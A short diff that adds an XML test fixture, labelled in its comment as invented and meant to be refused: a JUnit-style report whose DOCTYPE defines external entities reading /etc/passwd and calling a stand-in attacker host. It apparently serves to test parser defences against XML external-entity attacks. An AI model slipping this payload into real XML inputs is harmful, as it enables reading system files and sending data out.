@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!-- Invented fixture: an external-entity read wearing a JUnit costume. MUST be refused. -->
+<!DOCTYPE testsuites [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.invalid/collect?c=1">
+]>
+<testsuites name="checkout-service" tests="1" failures="1" errors="0" skipped="0">
+  <testsuite name="Exfiltrate" tests="1" failures="1" errors="0" skipped="0" time="0.02">
+    <testcase name="leaks" classname="Exfiltrate" time="0.02">
+      <failure message="&xxe;" type="AssertionError">&remote;</failure>
+    </testcase>
+  </testsuite>
+</testsuites>
